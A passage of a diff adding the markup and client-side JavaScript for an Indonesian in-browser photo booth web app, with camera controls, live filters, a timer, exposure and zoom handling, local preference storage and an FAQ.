+          <svg class="ms" viewBox="0 -960 960 960" aria-hidden="true">
+            <path d="M140-160q-24 0-42-18t-18-42v-520q0-24 18-42t42-18h520q24 0 42 18t18 42v215l134-134q7-7 16.5-3.5T880-649v338q0 10-9.5 13.5T854-301L720-435v215q0 24-18 42t-42 18H140Z"/>
+          </svg>
+        </button>
+      </div>
+      <div class="cam-actions">
+        <button type="button" class="thumb" id="thumbBtn" title="Foto" aria-label="Foto"><img id="thumbImg" alt=""></button>
+        <button type="button" class="shutter" id="captureBtn" title="Ambil foto (Space)" aria-label="Ambil foto">
+          <span class="burst-count" id="burstCount" hidden></span>
+        </button>
+        <button type="button" class="flip" id="cameraSwitchBtn" title="Ganti kamera (S)" aria-label="Ganti kamera" hidden>
+          <svg class="ms" viewBox="0 -960 960 960" aria-hidden="true">
+            <path d="M634-445q-6 66-48.5 114T480-283q-10 0-19.5-1.5T441-288q-7-2-13.5-.5T416-282q-10 10-7.5 22.5T423-242q14 5 28.5 7t28.5 2q85 0 141.5-62T683-443l20 20q8 8 18 8.5t18-7.5q8-8 8-18t-8-18l-61-60q-9-9-21-9t-21 9l-60 60q-8 8-8 18t8 18q8 8 17.5 8t17.5-8l23-23Zm-355 15-20-20q-8-8-18-8t-18 8q-8 8-8 17.5t8 17.5l60 60q9 9 21.5 9t21.5-9l60-60q8-8 8-18t-8-18q-8-8-17.5-8t-17.5 8l-23 23q6-66 48.5-114T482-590q10 0 19.5 1.5T521-585q7 2 13.5.5T546-591q10-10 7.5-22.5T539-631q-14-5-28.5-7t-28.5-2q-85 0-141.5 62T279-430ZM140-120q-24 0-42-18t-18-42v-513q0-23 18-41.5t42-18.5h147l55-66q8-11 20-16t26-5h184q14 0 26 5t20 16l55 66h147q23 0 41.5 18.5T880-693v513q0 24-18.5 42T820-120H140Z"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <div class="cam-menu" id="camMenu" role="menu" aria-label="Pilih kamera"></div>
+    <div class="flash-overlay" id="flashOverlay" aria-hidden="true"></div>
+
+    <div class="viewer" id="viewer">
+      <div class="view-top">
+        <button type="button" class="cam-plain" id="viewBackBtn" title="Kembali (Esc)" aria-label="Kembali">
+          <svg class="ms" viewBox="0 -960 960 960" aria-hidden="true">
+            <path d="m368-480 315 315q11 11 11 27.5T683-109q-12 12-28.5 12T626-109L297-438q-9-9-13-20t-4-22q0-11 4-22t13-20l330-330q12-12 28-11.5t28 12.5q11 12 11.5 28T683-795L368-480Z"/>
+          </svg>
+        </button>
+        <span class="view-count" id="viewCount"></span>
+        <div class="view-group">
+          <button type="button" class="cam-plain" id="shareBtnEditor" title="Bagikan" aria-label="Bagikan">
+            <svg class="ms" viewBox="0 -960 960 960" aria-hidden="true">
+              <path d="M220-80q-24 0-42-18t-18-42v-469q0-24 18-42t42-18h139q12.75 0 21.38 8.68 8.62 8.67 8.62 21.5 0 12.82-8.62 21.32-8.63 8.5-21.38 8.5H220v469h520v-469H599q-12.75 0-21.37-8.68-8.63-8.67-8.63-21.5 0-12.82 8.63-21.32 8.62-8.5 21.37-8.5h141q24 0 42 18t18 42v469q0 24-18 42t-42 18H220Z"/>
+            </svg>
+          </button>
+          <button type="button" class="cam-plain" id="copyBtnEditor" title="Salin (C)" aria-label="Salin">
+            <svg class="ms" viewBox="0 -960 960 960" aria-hidden="true">
+              <path d="M300-200q-24 0-42-18t-18-42v-560q0-24 18-42t42-18h440q24 0 42 18t18 42v560q0 24-18 42t-42 18H300Zm0-60h440v-560H300v560ZM180-80q-24 0-42-18t-18-42v-590q0-12.75 8.68-21.38 8.67-8.62 21.5-8.62 12.82 0 21.32 8.62 8.5 8.63 8.5 21.38v590h470q12.75 0 21.38 8.68 8.62 8.67 8.62 21.5 0 12.82-8.62 21.32Q662.75-80 650-80H180Z"/>
+            </svg>
+          </button>
+          <button type="button" class="cam-plain" id="deleteBtn" title="Hapus (Del)" aria-label="Hapus">
+            <svg class="ms" viewBox="0 -960 960 960" aria-hidden="true">
+              <path d="M261-120q-24.75 0-42.37-17.63Q201-155.25 201-180v-570h-11q-12.75 0-21.37-8.68-8.63-8.67-8.63-21.5 0-12.82 8.63-21.32 8.62-8.5 21.37-8.5h158q0-13 8.63-21.5 8.62-8.5 21.37-8.5h204q12.75 0 21.38 8.62Q612-822.75 612-810h158q12.75 0 21.38 8.68 8.62 8.67 8.62 21.5 0 12.82-8.62 21.32-8.63 8.5-21.38 8.5h-11v570q0 24.75-17.62 42.37Q723.75-120 699-120H261Z"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+      <div class="view-area" id="viewArea">
+        <img id="viewImg" alt="Foto yang diambil">
+        <video id="viewVideo" controls playsinline preload="auto" hidden></video>
+      </div>
+      <div class="view-bottom">
+        <div class="film-row" id="filmRow" hidden>
+          <div class="filmstrip" id="filmstrip"></div>
+          <button type="button" class="all-btn" id="allBtn" title="Unduh semua" aria-label="Unduh semua">
+            <svg class="ms" viewBox="0 -960 960 960" aria-hidden="true">
+              <path d="M469-327q-5-2-10-7L308-485q-9-9.27-8.5-21.64.5-12.36 9.11-21.36 9.39-9 21.89-9t21.5 9l98 99v-341q0-12.75 8.68-21.38 8.67-8.62 21.5-8.62 12.82 0 21.32 8.62 8.5 8.63 8.5 21.38v341l99-99q8.8-9 20.9-8.5 12.1.5 21.49 9.5 8.61 9 8.61 21.5t-9 21.5L501-334q-5 5-10.13 7-5.14 2-11 2-5.87 0-10.87-2ZM220-160q-24 0-42-18t-18-42v-113q0-12.75 8.68-21.38 8.67-8.62 21.5-8.62 12.82 0 21.32 8.62 8.5 8.63 8.5 21.38v113h520v-113q0-12.75 8.68-21.38 8.67-8.62 21.5-8.62 12.82 0 21.32 8.62 8.5 8.63 8.5 21.38v113q0 24-18 42t-42 18H220Z"/>
+            </svg>
+            <span>Semua</span> <span id="allCount"></span>
+          </button>
+        </div>
+        <button type="button" class="btn" id="downloadBtn">
+          <svg class="ms" viewBox="0 -960 960 960" aria-hidden="true">
+            <path d="M469-327q-5-2-10-7L308-485q-9-9.27-8.5-21.64.5-12.36 9.11-21.36 9.39-9 21.89-9t21.5 9l98 99v-341q0-12.75 8.68-21.38 8.67-8.62 21.5-8.62 12.82 0 21.32 8.62 8.5 8.63 8.5 21.38v341l99-99q8.8-9 20.9-8.5 12.1.5 21.49 9.5 8.61 9 8.61 21.5t-9 21.5L501-334q-5 5-10.13 7-5.14 2-11 2-5.87 0-10.87-2Z"/>
+          </svg>
+          <span>Unduh JPG</span>
+        </button>
+      </div>
+      <div class="del-sheet" id="delSheet" hidden>
+        <button type="button" id="delConfirm">Hapus</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<section class="info" id="info">
+  <div class="info-inner">
+    <h2>Tentang PhotoBoothWeb</h2>
+    <p>PhotoBoothWeb mengubah webcam atau kamera HP Anda menjadi bilik foto online yang berjalan sepenuhnya di browser. Klik "Mulai Kamera", izinkan akses, lalu tekan tombol shutter untuk mengambil foto. Semua proses berjalan lokal — tidak ada foto yang diunggah ke server.</p>
+
+    <h2>Fitur</h2>
+    <p>Timer 3/10 detik, 14 filter live, mirror mode, grid, zoom (pinch/scroll/preset), rasio aspek (1:1, 4:3, 3:4, 16:9, 9:16), night mode, exposure control, mode video dengan suara, burst, galeri, dan unduh JPG/ZIP.</p>
+
+    <h2>FAQ</h2>
+    <details class="faq"><summary>Bagaimana cara ambil foto?</summary>
+      <p>Klik Mulai Kamera, izinkan akses. Tekan tombol shutter atau Spasi untuk mengambil foto. Foto masuk ke thumbnail di kiri tombol.</p>
+    </details>
+    <details class="faq"><summary>Apakah ada timer?</summary>
+      <p>Ya. Klik ikon timer di atas untuk memilih off, 3, atau 10 detik.</p>
+    </details>
+    <details class="faq"><summary>Apakah foto diunggah?</summary>
+      <p>Tidak. Semua proses (capture, filter, encode) berjalan di browser. Kamera mati saat Anda keluar.</p>
+    </details>
+    <details class="faq"><summary>Kamera tidak muncul / layar hitam?</summary>
+      <p>Biasanya karena aplikasi lain sedang memakai kamera, atau izin ditolak. Tutup aplikasi video call, lalu izinkan kamera di ikon address bar browser.</p>
+    </details>
+  </div>
+</section>
+
+<footer class="footer">
+  © <a href="/">PhotoBoothWeb</a> | <a href="#">Privasi</a> | <a href="#">Syarat</a>
+</footer>
+
+<div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+<script>
+"use strict";
+/* ============ Helpers ============ */
+const $ = id => document.getElementById(id);
+const NUM1 = new Intl.NumberFormat('id-ID', { maximumFractionDigits: 1 });
+const NUM1F = new Intl.NumberFormat('id-ID', { minimumFractionDigits: 1, maximumFractionDigits: 1 });
+let toastTimer;
+function toast(msg) {
+  const t = $('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => t.classList.remove('show'), 2400);
+}
+
+/* ============ Theme ============ */
+const themeColorMeta = document.querySelector('meta[name="theme-color"]');
+const syncThemeColor = () => {
+  themeColorMeta.content = document.documentElement.dataset.theme === 'dark' ? '#1a1a1a' : '#ffffff';
+};
+(function initTheme() {
+  let saved;
+  try { saved = localStorage.theme; } catch (e) {}
+  const theme = saved || (matchMedia('(prefers-color-scheme:dark)').matches ? 'dark' : 'light');
+  document.documentElement.dataset.theme = theme;
+  syncThemeColor();
+})();
+$('themeToggle').addEventListener('click', () => {
+  const t = document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.theme = t;
+  try { localStorage.theme = t; } catch (e) {}
+  syncThemeColor();
+});
+
+/* ============ State ============ */
+const video = $('video');
+const cam = $('cam');
+const shotBox = $('shotBox');
+
+let stream = null;
+let cams = [];
+let currentDeviceId = null;
+let mirrored = true;
+let flashOn = false;
+let hasTorch = false;
+let hwZoom = null;
+let hwExposure = null;
+let gridOn = false;
+let timerSec = 0;
+let filterIdx = 0;
+let ratioIdx = 0;
+let zoom = 1;
+let counting = null;
+let exposure = 0;
+let nightOn = false;
+let camMode = 'photo';
+let micOn = true;
+let rec = null;
+let recStartTime = 0;
+let recTimerInt = null;
+
+const shots = []; // { type:'photo'|'video', blob, url, name, w, h }
+const MAX_SHOTS = 30;
+const JPEG_QUALITY = 0.95;
+let viewIdx = 0;
+
+/* ============ Persistence ============ */
+const PREFS_KEY = 'photoboothweb.prefs';
+function savePrefs() {
+  try {
+    localStorage.setItem(PREFS_KEY, JSON.stringify({
+      filterIdx, ratioIdx, gridOn, mirrored, nightOn, timerSec, micOn, camMode
+    }));
+  } catch (e) {}
+}
+function loadPrefs() {
+  try {
+    const p = JSON.parse(localStorage.getItem(PREFS_KEY) || '{}');
+    if (typeof p.filterIdx === 'number') filterIdx = Math.min(p.filterIdx, 13);
+    if (typeof p.ratioIdx === 'number') ratioIdx = Math.min(p.ratioIdx, 5);
+    if (typeof p.gridOn === 'boolean') gridOn = p.gridOn;
+    if (typeof p.mirrored === 'boolean') mirrored = p.mirrored;
+    if (typeof p.nightOn === 'boolean') nightOn = p.nightOn;
+    if (typeof p.timerSec === 'number') timerSec = [0, 3, 10].includes(p.timerSec) ? p.timerSec : 0;
+    if (typeof p.micOn === 'boolean') micOn = p.micOn;
+    if (p.camMode === 'video') camMode = 'video';
+  } catch (e) {}
+}
+loadPrefs();
+
+/* ============ Zoom / Look ============ */
+const ZOOM_PRESETS = [1, 2, 3];
+const minZoom = () => hwZoom ? Math.max(1, hwZoom.min) : 1;
+const maxZoom = () => hwZoom ? Math.min(hwZoom.max, 8) : 4;
+const evGain = () => (!hwExposure && exposure) ? Math.pow(2, exposure / 2.2) : 1;
+
+function lookCss() {
+  const baseFilter = FILTERS[filterIdx][1];
+  const g = evGain();
+  const parts = [];
+  if (Math.abs(g - 1) > 0.001) parts.push(`brightness(${g.toFixed(3)})`);
+  if (baseFilter !== 'none') parts.push(baseFilter);
+  return parts.length ? parts.join(' ') : 'none';
+}
+function paintLook() {
+  let f = lookCss();
+  if (mirrored) f += ' scaleX(-1)';
+  video.style.filter = f === 'none' && !mirrored ? 'none' : (f === 'none' ? 'scaleX(-1)' : f);
+  // Untuk transform yang benar: filter dan transform terpisah
+  video.style.filter = lookCss();
+  video.style.transform = mirrored ? 'scaleX(-1)' : 'none';
+}
+function updateTransform() { paintLook(); }
+
+function applyZoom(z) {
+  zoom = Math.min(maxZoom(), Math.max(minZoom(), z));
+  if (hwZoom && stream) {
+    stream.getVideoTracks()[0].applyConstraints({ advanced: [{ zoom: zoom }] }).catch(() => {});
+  }
+    document.querySelectorAll('.zoom-chip').forEach(b => {
+    b.setAttribute('aria-pressed', String(parseFloat(b.dataset.z) === zoom));
+  });
+}
+
+$('zoomRow').addEventListener('click', e => {
+  const chip = e.target.closest('.zoom-chip');
+  if (chip) applyZoom(parseFloat(chip.dataset.z));
+});
+
+/* ============ Data ============ */
+const FILTERS = [
+  ['Original', 'none'],
+  ['Vivid', 'saturate(1.7) contrast(1.1)'],
+  ['Vivid Warm', 'saturate(1.6) contrast(1.08) sepia(0.18) hue-rotate(-8deg)'],
+  ['Vivid Cool', 'saturate(1.5) contrast(1.08) hue-rotate(12deg) brightness(1.03)'],
+  ['Dramatic', 'contrast(1.4) saturate(0.85) brightness(0.92)'],
+  ['Dramatic Warm', 'contrast(1.35) saturate(0.95) sepia(0.25) brightness(0.93)'],
+  ['Dramatic Cool', 'contrast(1.35) saturate(0.8) hue-rotate(15deg) brightness(0.93)'],
+  ['Mono', 'grayscale(1)'],
+  ['Silvertone', 'grayscale(1) contrast(1.15) brightness(1.08)'],
+  ['Noir', 'grayscale(1) contrast(1.35) brightness(0.95)'],
+  ['Warm', 'saturate(1.3) sepia(0.22) hue-rotate(-10deg)'],
+  ['Cool', 'saturate(1.1) hue-rotate(15deg) brightness(1.05)'],
+  ['Sepia', 'sepia(0.7)'],
+  ['Vintage', 'sepia(0.4) contrast(1.1) brightness(1.05) saturate(1.25)'],
+  ['Fade', 'contrast(0.82) saturate(0.8) brightness(1.1)']
+];
+
+const RATIOS = [
+  ['Full', null],
+  ['1:1', { w: 1, h: 1 }],
+  ['4:3', { w: 4, h: 3 }],
+  ['3:4', { w: 3, h: 4 }],
+  ['16:9', { w: 16, h: 9 }],
+  ['9:16', { w: 9, h: 16 }]
+];
+
+const TIMER_GLYPH = {
+  0: 'M480-801q68 0 126.5 22.5T711-716l30-30q9-9 21-9t21 9q9 9 9 21t-9 21l-30 30q45 49 66 108.5T840-441q0 38-7.5 75T808-294q-8 17-20 21t-23-1q-11-5-16-14.5t0-20.5q14-27 22.5-60.5T780-441q0-125-87.5-212.5T480-741q-37 0-71.5 8.5T347-710q-11 6-21 1t-15-16q-5-11-1.5-23t20.5-20q35-17 73.5-25t76.5-8Zm30 276v-88q0-13-8.5-21.5T480-643q-13 0-21.5 8.5T450-613v28l60 60ZM480-81q-74 0-139.5-28.5T226-187q-49-49-77.5-114.5T120-441q0-61 18.5-116T199-665L78-786q-9-9-9-21.5t9-21.5q9-9 21.5-9t21.5 9l709 709q9 9 9 21t-9 21q-9 9-21.5 9T787-78l-83-82q-48 38-103.5 58.5T480-81Z',
+  3: 'M528-281q24 0 42-15t18-38v-63q0-15-9.5-26T555-441q14-7 23.5-18.5T588-486v-55q0-25-17.5-42.5T528-601H403q-13 0-21.5 8.5T373-571q0 13 8.5 21.5T403-541h125v70h-85q-13 0-21.5 8.5T413-441q0 13 8.5 21.5T443-411h85v70H403q-13 0-21.5 8.5T373-311q0 13 8.5 21.5T403-281h125ZM390-860q-13 0-21.5-8.5T360-890q0-13 8.5-21.5T390-920h180q13 0 21.5 8.5T600-890q0 13-8.5 21.5T570-860H390Zm-49.5 750.5Q275-138 226-187t-77.5-114.5Q120-367 120-441t28.5-139.5Q177-646 226-695t114.5-77.5Q406-801 480-801q67 0 126 22.5T711-716l30-30q9-9 21-9t21 9q9 9 9 21t-9 21l-30 30q36 40 61.5 97T840-441q0 74-28.5 139.5T734-187q-49 49-114.5 77.5T480-81Z',
+  10: 'M416.5-289.63q8.5-8.62 8.5-21.37v-260q0-12.75-8.62-21.38Q407.75-601 395-601h-50q-12.75 0-21.37 8.68-8.63 8.67-8.63 21.5 0 12.82 8.63 21.32 8.62 8.5 21.37 8.5h20v230q0 12.75 8.68 21.37 8.67 8.63 21.5 8.63 12.82 0 21.32-8.63ZM525-281h60q26 0 43-17t17-43v-200q0-26-17-43t-43-17h-60q-26 0-43 17t-17 43v200q0 26 17 43t43 17Zm0-60v-200h60v200h-60Zm167.5 112.5Q780-316 780-441t-87.5-212.5Q605-741 480-741t-212.5 87.5Q180-566 180-441t87.5 212.5Q355-141 480-141t212.5-87.5ZM480-440Zm-90-420q-12.75 0-21.37-8.68-8.63-8.67-8.63-21.5 0-12.82 8.63-21.32 8.62-8.5 21.37-8.5h180q12.75 0 21.38 8.68 8.62 8.67 8.62 21.5 0 12.82-8.62 21.32-8.63 8.5-21.38 8.5H390Z'
+};
+
+/* ============ Filter Carousel ============ */
+const filterTrack = $('filterTrack');
+const filterStrip = $('filterStrip');
+FILTERS.forEach(([name], i) => {
+  const b = document.createElement('button');
+  b.type = 'button';
+  b.className = 'mode';
+  b.textContent = name;
+  b.setAttribute('aria-pressed', String(i === filterIdx));
+  b.addEventListener('click', e => { if (e.detail === 0) applyFilter(i); });
+  filterTrack.appendChild(b);
+});
+
+const car = { pos: 0, anim: 0, drag: null };
+const nameCentre = i => filterTrack.children[i].offsetLeft + filterTrack.children[i].offsetWidth / 2;
+const stripCentre = () => filterStrip.clientWidth / 2;
+const posFor = i => stripCentre() - nameCentre(i);
+
+function setTrack(x) {
+  car.pos = x;
+  filterTrack.style.transform = `translateX(${x.toFixed(1)}px)`;
+}
+function nameAt(x) {
+  const center = stripCentre() - x;
+  let best = 0, bestDist = Infinity;
+  for (let i = 0; i < FILTERS.length; i++) {
+    const d = Math.abs(nameCentre(i) - center);
+    if (d < bestDist) { bestDist = d; best = i; }
+  }
+  return best;
+}
+function glide(target, live) {
+  cancelAnimationFrame(car.anim);
+  const start = car.pos, delta = target - start, t0 = performance.now();
+  const dur = Math.min(560, Math.max(200, Math.abs(delta) * 1.1));
+  const step = t => {
+    const p = Math.min(1, (t - t0) / dur);
+    setTrack(start + delta * (1 - Math.pow(1 - p, 3)));
+    if (live) applyFilter(nameAt(car.pos));
+    if (p < 1) car.anim = requestAnimationFrame(step);
+  };
+  car.anim = requestAnimationFrame(step);
+}
+function applyFilter(i) {
+  i = Math.max(0, Math.min(i, FILTERS.length - 1));
+  if (i !== filterIdx) {
+    filterIdx = i;
+    paintLook();
+    [...filterTrack.children].forEach((b, k) => b.setAttribute('aria-pressed', String(k === i)));
+    savePrefs();
+  }
+}
+function setFilter(i) {
+  applyFilter(i);
+  glide(posFor(i), false);
+}
+function centerFilter() {
+  if (filterStrip.clientWidth) {
+    cancelAnimationFrame(car.anim);
+    setTrack(posFor(filterIdx));
+  }
+}
+
+function dragStart(x, tapIdx) {
+  cancelAnimationFrame(car.anim);
+  car.drag = { p0: x, from: car.pos, tapIdx, moved: false, hist: [[performance.now(), x]] };
+}
+function dragMove(x) {
+  const d = car.drag;
+  if (!d) return;
+  if (!d.moved && Math.abs(x - d.p0) <= 6) return;
+  d.moved = true;
+  let pos = d.from + (x - d.p0);
+  const min = posFor(0), max = posFor(FILTERS.length - 1);
+  if (pos > min) pos = min + 0.3 * (pos - min);
+  else if (pos < max) pos = max + 0.3 * (pos - max);
+  setTrack(pos);
+  applyFilter(nameAt(pos));
+  const now = performance.now();
+  d.hist.push([now, x]);
+  while (d.hist.length > 2 && now - d.hist[0][0] > 90) d.hist.shift();
+}
+function dragEnd() {
+  const d = car.drag;
+  car.drag = null;
+  if (!d) return;
+  if (!d.moved) { if (d.tapIdx >= 0) setFilter(d.tapIdx); return; }
+  const [t0, x0] = d.hist[0];
+  const [t1, x1] = d.hist[d.hist.length - 1];
+  const v = (t1 > t0 && performance.now() - t1 < 80) ? (x1 - x0) / (t1 - t0) : 0;
+  glide(posFor(nameAt(car.pos + 240 * v)), true);
+}
+filterStrip.addEventListener('pointerdown', e => {
+  if (e.button > 0) return;
+  filterStrip.setPointerCapture?.(e.pointerId);
+  const b = e.target.closest('.mode');
+  dragStart(e.clientX, b ? [...filterTrack.children].indexOf(b) : -1);
+});
+filterStrip.addEventListener('pointermove', e => { if (car.drag) dragMove(e.clientX); });
+filterStrip.addEventListener('pointerup', dragEnd);
+filterStrip.addEventListener('pointercancel', dragEnd);
+filterStrip.addEventListener('wheel', e => {
+  e.preventDefault();
+  cancelAnimationFrame(car.anim);
+  const d = Math.abs(e.deltaX) > Math.abs(e.deltaY) ? e.deltaX : e.deltaY;
+  setTrack(Math.min(posFor(0), Math.max(posFor(FILTERS.length - 1), car.pos - d)));
+  applyFilter(nameAt(car.pos));
+  clearTimeout(car.wheel);
+  car.wheel = setTimeout(() => glide(posFor(filterIdx), false), 130);
+}, { passive: false });
+
+/* ============ Timer ============ */
+const TIMER_STEPS = [0, 3, 10];
+function setTimer(s) {
+  timerSec = s;
+  $('timerBtn').classList.toggle('on', s > 0);
+  const p = $('timerBtnPath');
+  if (p) p.setAttribute('d', TIMER_GLYPH[s]);
+  savePrefs();
+}
+$('timerBtn').addEventListener('click', () => {
+  setTimer(TIMER_STEPS[(TIMER_STEPS.indexOf(timerSec) + 1) % TIMER_STEPS.length]);
+});
+
+/* ============ Aspect Ratio ============ */
+const FULL_GLYPH = $('ratioBtn').innerHTML;
+function buildRatios() {
+  const row = $('optRow');
+  row.innerHTML = '';
+  RATIOS.forEach(([name], i) => {
+    const b = document.createElement('button');
+    b.type = 'button';
+    b.className = 'opt';
+    b.textContent = name;
+    b.setAttribute('aria-pressed', String(i === ratioIdx));
+    b.addEventListener('click', () => { setRatio(i); setStrip('filters'); });
+    row.appendChild(b);
+  });
+  const active = row.querySelector('[aria-pressed="true"]');
+  if (active && row.scrollWidth > row.clientWidth) {
+    const r = row.getBoundingClientRect(), a = active.getBoundingClientRect();
+    row.scrollLeft += a.left + a.width / 2 - (r.left + r.width / 2);
+  }
+}
+function setRatio(i, save = true) {
+  if (rec) return;
+  ratioIdx = i;
+  if (RATIOS[i][1]) {
+    $('ratioBtn').innerHTML = '<span class="ratio-txt">' + RATIOS[i][0] + '</span>';
+  } else {
+    $('ratioBtn').innerHTML = FULL_GLYPH;
+  }
+  $('ratioBtn').classList.toggle('on', !!RATIOS[i][1]);
+  if (save) savePrefs();
+}
+$('ratioBtn').addEventListener('click', () => {
+  if (rec) return;
+  setStrip(strip === 'ratio' ? 'filters' : 'ratio');
+});
+
+/* ============ Strip switching ============ */
+let strip = 'filters';
+function setStrip(name) {
+  const prev = strip;
+  strip = name;
+  $('filterStrip').hidden = name === 'exposure';
+  $('optRow').hidden = name !== 'ratio';
+  if (name === 'ratio') buildRatios();
+  if (name === 'filters') requestAnimationFrame(centerFilter);
+  if (name === 'exposure') requestAnimationFrame(drawRuler);
+  $('ratioBtn').setAttribute('aria-expanded', String(name === 'ratio'));
+  $('exposureBtn').setAttribute('aria-expanded', String(name === 'exposure'));
+}
+
+/* ============ Exposure Ruler ============ */
+const EV_PX = 46;
+function evLabel(v) {
+  const r = Math.round(10 * v) / 10;
+  if (r === 0) return '0';
+  return (r > 0 ? '+' : '−') + NUM1F.format(Math.abs(r));
+}
+function setExposure(v) {
+  const lo = hwExposure ? Math.max(-2, hwExposure.min) : -2;
+  const hi = hwExposure ? Math.min(2, hwExposure.max) : 2;
+  exposure = Math.min(Math.max(v, lo), hi);
+  $('evLead').textContent = evLabel(exposure);
+  paintLook();
+  drawRuler();
+  savePrefs();
+  if (hwExposure && stream) {
+    stream.getVideoTracks()[0].applyConstraints({ advanced: [{ exposureCompensation: exposure }] }).catch(() => {});
+  }
+}
+function drawRuler() {
+  const cv = $('evRuler');
+  if (!cv || !cv.isConnected) return;
+  const dpr = Math.min(window.devicePixelRatio || 1, 2);
+  const r = cv.getBoundingClientRect();
+  const w = r.width, h = r.height;
+  if (!w || !h) return;
+  cv.width = Math.round(w * dpr);
+  cv.height = Math.round(h * dpr);
+  const ctx = cv.getContext('2d');
+  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+  ctx.clearRect(0, 0, w, h);
+  const lo = hwExposure ? Math.max(-2, hwExposure.min) : -2;
+  const hi = hwExposure ? Math.min(2, hwExposure.max) : 2;
+  const toX = v => ((v - lo) / (hi - lo)) * (w - 20) + 10;
+  const cy = h / 2;
+  ctx.strokeStyle = 'rgba(255,255,255,.35)';
+  ctx.lineWidth = 3;
+  ctx.lineCap = 'round';
+  ctx.beginPath(); ctx.moveTo(toX(lo), cy); ctx.lineTo(toX(hi), cy); ctx.stroke();
+  ctx.strokeStyle = 'rgba(255,255,255,.5)';
+  ctx.lineWidth = 1;
+  for (let v = Math.ceil(lo * 2) / 2; v <= hi; v += 0.5) {
+    const x = toX(v), len = v === 0 ? 8 : 4;
+    ctx.beginPath(); ctx.moveTo(x, cy - len); ctx.lineTo(x, cy + len); ctx.stroke();
+  }
+  const x = toX(exposure);
+  ctx.beginPath();
+  ctx.arc(x, cy, 11, 0, Math.PI * 2);
+  ctx.fillStyle = '#fff';
+  ctx.shadowColor = 'rgba(0,0,0,.35)';
+  ctx.shadowBlur = 6;
+  ctx.fill();
+  ctx.shadowBlur = 0;
+}
+$('exposureBtn').addEventListener('click', () => {
+  if (rec) return;
+  setStrip(strip === 'exposure' ? 'filters' : 'exposure');
+});
+$('evLead')?.addEventListener('click', () => setStrip('filters'));
+
+/* drag ruler */
+(function () {
+  const cv = $('evRuler');
+  if (!cv) return;
+  let dragging = false;
+  const getVal = e => {
+    const r = cv.getBoundingClientRect();
+    const lo = hwExposure ? Math.max(-2, hwExposure.min) : -2;
+    const hi = hwExposure ? Math.min(2, hwExposure.max) : 2;
+    const ratio = Math.min(1, Math.max(0, (e.clientX - r.left - 10) / (r.width - 20)));
+    return lo + ratio * (hi - lo);
+  };
+  cv.addEventListener('pointerdown', e => {
+    dragging = true;
+    cv.setPointerCapture?.(e.pointerId);
+    setExposure(getVal(e));
+  });
+  cv.addEventListener('pointermove', e => { if (dragging) setExposure(getVal(e)); });
+  cv.addEventListener('pointerup', () => { dragging = false; });
+  cv.addEventListener('pointercancel', () => { dragging = false; });
+})();
+
+/* ============ Grid & Mirror ============ */
+function toggleGrid() {
+  gridOn = !gridOn;
+  $('gridOverlay').classList.toggle('active', gridOn);
+  $('gridBtn').setAttribute('aria-pressed', String(gridOn));
+  savePrefs();
+}
+function toggleMirror() {
+  mirrored = !mirrored;
+  $('mirrorBtn').setAttribute('aria-pressed', String(mirrored));
+  paintLook();
+  savePrefs();
+}
+$('gridBtn').addEventListener('click', toggleGrid);
+$('mirrorBtn').addEventListener('click', toggleMirror);
+
+/* ============ Night Mode ============ */
+function toggleNight() {
+  nightOn = !nightOn;
+  $('nightBtn').setAttribute('aria-pressed', String(nightOn));
+  savePrefs();
+}
+$('nightBtn').addEventListener('click', toggleNight);
+
+/* ============ Flash ============ */
+async function toggleFlash() {
+  flashOn = !flashOn;
+  $('flashBtn').setAttribute('aria-pressed', String(flashOn));
+  if (hasTorch && stream) {
+    try {
+      await stream.getVideoTracks()[0].applyConstraints({ advanced: [{ torch: flashOn }] });
+    } catch (e) {}
+  }
+}
+$('flashBtn').addEventListener('click', toggleFlash);
+
+/* ============ Camera Mode Photo/Video ============ */
+function setCamMode(m) {
+  if (rec) return;
+  camMode = m;
+  cam.classList.toggle('video', m === 'video');
+  $('modePhoto').setAttribute('aria-pressed', String(m === 'photo'));
+  $('modeVideo').setAttribute('aria-pressed', String(m === 'video'));
+  $('micBtn').hidden = m !== 'video';
+  $('captureBtn').title = m === 'video' ? 'Rekam video (Space)' : 'Ambil foto (Space)';
+  $('captureBtn').setAttribute('aria-label', m === 'video' ? 'Rekam video' : 'Ambil foto');
+  savePrefs();
+}
+$('modePhoto').addEventListener('click', () => setCamMode('photo'));
+$('modeVideo').addEventListener('click', () => setCamMode('video'));
+$('micBtn').addEventListener('click', () => {
+  micOn = !micOn;
+  $('micBtn').setAttribute('aria-pressed', String(micOn));
+  savePrefs();
+});
+
+/* ============ Start Camera ============ */
+async function startCamera(deviceId) {
+  const videoConstraints = deviceId
+    ? { deviceId: { exact: deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 } }
+    : { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } };
+  const audioConstraints = camMode === 'video' && micOn;
+  try {
+    if (stream) stream.getTracks().forEach(t => t.stop());
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: videoConstraints,
+      audio: audioConstraints
+    });
+    video.srcObject = stream;
+    video.play().catch(() => {});
+    video.classList.add('live');
+
+    const track = stream.getVideoTracks()[0];
+    const settings = track.getSettings();
+    currentDeviceId = settings.deviceId;
+    hwZoom = settings.zoom !== undefined && 'zoom' in track.getCapabilities?.() ? track.getCapabilities().zoom : null;
+    const caps = track.getCapabilities ? track.getCapabilities() : {};
+    hasTorch = !!caps.torch;
+    hwExposure = caps.exposureCompensation ? caps.exposureCompensation : null;
+    $('flashBtn').hidden = !hasTorch;
+
+    if (hwExposure) {
+      const lo = Math.max(-2, hwExposure.min);
+      const hi = Math.min(2, hwExposure.max);
+      exposure = Math.min(hi, Math.max(lo, exposure));
+    }
+    $('evLead').textContent = evLabel(exposure);
+    paintLook();
+    applyZoom(zoom);
+    await enumerateCams();
+    track.addEventListener('ended', () => stopCamera());
+  } catch (err) {
+    console.error(err);
+    if (err.name === 'NotAllowedError') toast('Izin kamera ditolak. Aktifkan lewat ikon address bar.');
+    else if (err.name === 'NotFoundError') toast('Tidak ada kamera terdeteksi.');
+    else if (err.name === 'NotReadableError') toast('Kamera dipakai aplikasi lain.');
+    else toast('Gagal membuka kamera.');
+    stopCamera();
+    return false;
+  }
+  return true;
